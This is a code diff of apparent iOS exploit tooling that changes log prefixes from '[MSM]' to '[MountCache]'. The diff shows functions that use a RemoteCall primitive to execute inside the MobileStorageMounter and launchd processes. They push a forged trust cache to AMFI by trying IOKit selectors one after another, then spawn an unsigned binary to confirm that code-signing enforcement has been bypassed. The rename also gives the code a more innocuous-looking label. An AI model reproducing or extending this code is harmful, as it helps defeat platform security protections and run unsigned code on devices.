@@ -163,12 +163,12 @@ static void msm_load_tc_callback(RemoteCallSession *session)
     @autoreleasepool {
         NSString *tcPath = [session.userInfo objectForKey:@"tcPath"];
         if (!tcPath) {
-            printf("[MSM] no tcPath in userInfo\n");
+            printf("[MountCache] no tcPath in userInfo\n");
             return;
         }
 
         const char *cpath = tcPath.UTF8String;
-        printf("[MSM] loading trust cache from: %s\n", cpath);
+        printf("[MountCache] loading trust cache from: %s\n", cpath);
 
         // The simplest path: MSM has pmap.load-trust-cache entitlement.
         // We open and read the TC file, then attempt IOKit calls to
@@ -180,13 +180,13 @@ static void msm_load_tc_callback(RemoteCallSession *session)
 
         int fd = open(cpath, O_RDONLY);
         if (fd < 0) {
-            printf("[MSM] cannot open TC file: %s\n", strerror(errno));
+            printf("[MountCache] cannot open TC file: %s\n", strerror(errno));
             return;
         }
 
         struct stat st;
         if (fstat(fd, &st) < 0) {
-            printf("[MSM] fstat failed: %s\n", strerror(errno));
+            printf("[MountCache] fstat failed: %s\n", strerror(errno));
             close(fd);
             return;
         }
@@ -207,7 +207,7 @@ static void msm_load_tc_callback(RemoteCallSession *session)
         close(fd);
 
         if (totalRead < sizeof(struct trust_cache_module)) {
-            printf("[MSM] TC file too small\n");
+            printf("[MountCache] TC file too small\n");
             free(tcData);
             return;
         }
@@ -219,7 +219,7 @@ static void msm_load_tc_callback(RemoteCallSession *session)
         void *func_get = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
 
         if (func_open && func_call && func_matching && func_get) {
-            printf("[MSM] IOKit functions available\n");
+            printf("[MountCache] IOKit functions available\n");
 
             CFDictionaryRef matching = IOServiceMatching("AppleMobileFileIntegrity");
             if (matching) {
@@ -228,13 +228,13 @@ static void msm_load_tc_callback(RemoteCallSession *session)
                     io_connect_t conn = 0;
                     kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
                     if (kr == KERN_SUCCESS && conn) {
-                        printf("[MSM] AMFI IOKit service opened (conn=0x%x)\n", conn);
+                        printf("[MountCache] AMFI IOKit service opened (conn=0x%x)\n", conn);
 
                         // Try struct method with TC data
                         size_t outSize = 0x1000;
                         uint8_t outBuf[0x1000];
                         kr = IOConnectCallStructMethod(conn, 0, tcData, tcSize, outBuf, &outSize);
-                        printf("[MSM] IOConnectCallStructMethod sel=0 → kr=0x%x\n", kr);
+                        printf("[MountCache] IOConnectCallStructMethod sel=0 → kr=0x%x\n", kr);
 
                         if (kr != KERN_SUCCESS) {
                             // Try other selectors
@@ -242,7 +242,7 @@ static void msm_load_tc_callback(RemoteCallSession *session)
                                 outSize = 0x1000;
                                 kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, outBuf, &outSize);
                                 if (kr == KERN_SUCCESS) {
-                                    printf("[MSM] TC loaded via IOKit selector %u!\n", sel);
+                                    printf("[MountCache] TC loaded via IOKit selector %u!\n", sel);
                                     g_msm_tc_loaded = true;
                                     break;
                                 }
@@ -253,14 +253,14 @@ static void msm_load_tc_callback(RemoteCallSession *session)
 
                         IOServiceClose(conn);
                     } else {
-                        printf("[MSM] IOServiceOpen failed: 0x%x\n", kr);
+                        printf("[MountCache] IOServiceOpen failed: 0x%x\n", kr);
                     }
                 } else {
-                    printf("[MSM] AMFI service not found\n");
+                    printf("[MountCache] AMFI service not found\n");
                 }
             }
         } else {
-            printf("[MSM] IOKit functions not resolvable via dlsym\n");
+            printf("[MountCache] IOKit functions not resolvable via dlsym\n");
         }
 
         free(tcData);
@@ -274,13 +274,13 @@ static void msm_wake_via_xpc(void)
 {
     xpc_connection_t conn = xpc_connection_create_mach_service(kMSMXPCSvc, NULL, 0);
     if (!conn) {
-        printf("[MSM] xpc_connection_create_mach_service failed\n");
+        printf("[MountCache] xpc_connection_create_mach_service failed\n");
         return;
     }
 
     xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
         if (event == XPC_ERROR_CONNECTION_INVALID) {
-            printf("[MSM] XPC connection invalid (MSM not running?)\n");
+            printf("[MountCache] XPC connection invalid (MSM not running?)\n");
         }
     });
 
@@ -305,29 +305,29 @@ static void msm_wake_via_xpc(void)
 bool msm_inject_trust_cache(const char *tcPath)
 {
     if (!tcPath) {
-        printf("[MSM] invalid tcPath\n");
+        printf("[MountCache] invalid tcPath\n");
         return false;
     }
 
-    printf("[MSM] === MobileStorageMounter Trust Cache Injection ===\n");
-    printf("[MSM] target: %s\n", tcPath);
+    printf("[MountCache] === MobileStorageMounter Trust Cache Injection ===\n");
+    printf("[MountCache] target: %s\n", tcPath);
 
     // Step 1: Wake MSM via XPC
-    printf("[MSM] waking MSM daemon via XPC...\n");
+    printf("[MountCache] waking MSM daemon via XPC...\n");
     msm_wake_via_xpc();
 
     // Step 2: Init RemoteCall to MSM
-    printf("[MSM] connecting to MobileStorageMounter via RemoteCall...\n");
+    printf("[MountCache] connecting to MobileStorageMounter via RemoteCall...\n");
 
     RemoteCallSession *session = [[RemoteCallSession alloc] initWithProcess:@"MobileStorageMounter"];
     if (!session) {
         RemoteCallInitFailure failure = remote_call_last_init_failure();
-        printf("[MSM] RemoteCall init failed: %s\n",
+        printf("[MountCache] RemoteCall init failed: %s\n",
                remote_call_init_failure_description(failure));
         return false;
     }
 
-    printf("[MSM] RemoteCall session active\n");
+    printf("[MountCache] RemoteCall session active\n");
 
     // Step 3: Execute trust cache load in MSM context
     __block bool loaded = false;
@@ -341,10 +341,10 @@ bool msm_inject_trust_cache(const char *tcPath)
 
         loaded = g_msm_tc_loaded;
     } @catch (NSException *e) {
-        printf("[MSM] RemoteCall exception: %s\n", e.reason.UTF8String);
+        printf("[MountCache] RemoteCall exception: %s\n", e.reason.UTF8String);
     }
 
-    printf("[MSM] trust cache loaded: %s\n", loaded ? "YES" : "NO");
+    printf("[MountCache] trust cache loaded: %s\n", loaded ? "YES" : "NO");
     return loaded;
 }
 
@@ -358,23 +358,23 @@ bool msm_verify_unsigned_execution(void)
     NSString *tcPath = [tmpDir stringByAppendingPathComponent:@"msm_tc.bin"];
 
     // Step 1: Write test binary
-    printf("[MSM] writing test binary...\n");
+    printf("[MountCache] writing test binary...\n");
     if (!msm_write_test_binary(binPath.UTF8String)) {
-        printf("[MSM] failed to write test binary\n");
+        printf("[MountCache] failed to write test binary\n");
         return false;
     }
 
     // Step 2: Compute CDHash
-    printf("[MSM] computing CDHash...\n");
+    printf("[MountCache] computing CDHash...\n");
     uint8_t *cdhash = msm_compute_cdhash(binPath.UTF8String);
     if (!cdhash) {
-        printf("[MSM] failed to compute CDHash\n");
+        printf("[MountCache] failed to compute CDHash\n");
         unlink(binPath.UTF8String);
         return false;
     }
 
     // Step 3: Build trust cache
-    printf("[MSM] building trust cache v2...\n");
+    printf("[MountCache] building trust cache v2...\n");
     size_t tcSize = 0;
     uint8_t *tcData = msm_build_trust_cache(cdhash, CS_CDHASH_LEN, &tcSize);
     free(cdhash);
@@ -394,7 +394,7 @@ bool msm_verify_unsigned_execution(void)
     fclose(fp);
     free(tcData);
 
-    printf("[MSM] CDHash: ");
+    printf("[MountCache] CDHash: ");
     {
         uint8_t *hash = msm_compute_cdhash(binPath.UTF8String);
         if (hash) {
@@ -405,24 +405,24 @@ bool msm_verify_unsigned_execution(void)
     }
 
     // Step 4: Inject via MSM
-    printf("[MSM] injecting trust cache via MSM...\n");
+    printf("[MountCache] injecting trust cache via MSM...\n");
     bool injected = msm_inject_trust_cache(tcPath.UTF8String);
 
     // Cleanup TC file
     unlink(tcPath.UTF8String);
 
     if (!injected) {
-        printf("[MSM] trust cache injection failed\n");
+        printf("[MountCache] trust cache injection failed\n");
         unlink(binPath.UTF8String);
         return false;
     }
 
     // Step 5: Attempt to spawn the test binary via launchd RC
-    printf("[MSM] verifying by spawning test binary...\n");
+    printf("[MountCache] verifying by spawning test binary...\n");
 
     RemoteCallSession *launchdSession = [[RemoteCallSession alloc] initWithProcess:@"launchd"];
     if (!launchdSession) {
-        printf("[MSM] launchd RC init failed\n");
+        printf("[MountCache] launchd RC init failed\n");
         unlink(binPath.UTF8String);
         return false;
     }
@@ -434,21 +434,21 @@ bool msm_verify_unsigned_execution(void)
             pid_t pid = 0;
             const char *argv[] = { cpath, NULL };
             int ret = posix_spawn(&pid, cpath, NULL, NULL, (char *const *)argv, NULL);
-            printf("[MSM] posix_spawn ret=%d pid=%d\n", ret, pid);
+            printf("[MountCache] posix_spawn ret=%d pid=%d\n", ret, pid);
             if (ret == 0 && pid > 0) {
                 spawned = true;
             }
         });
     } @catch (NSException *e) {
-        printf("[MSM] launchd spawn exception: %s\n", e.reason.UTF8String);
+        printf("[MountCache] launchd spawn exception: %s\n", e.reason.UTF8String);
     }
 
     unlink(binPath.UTF8String);
 
     if (spawned) {
-        printf("[MSM] ✅✅✅ unsigned binary executed!\n");
+        printf("[MountCache] ✅✅✅ unsigned binary executed!\n");
     } else {
-        printf("[MSM] ❌ spawn failed — AMFI still blocking\n");
+        printf("[MountCache] ❌ spawn failed — AMFI still blocking\n");
     }
 
     return spawned;
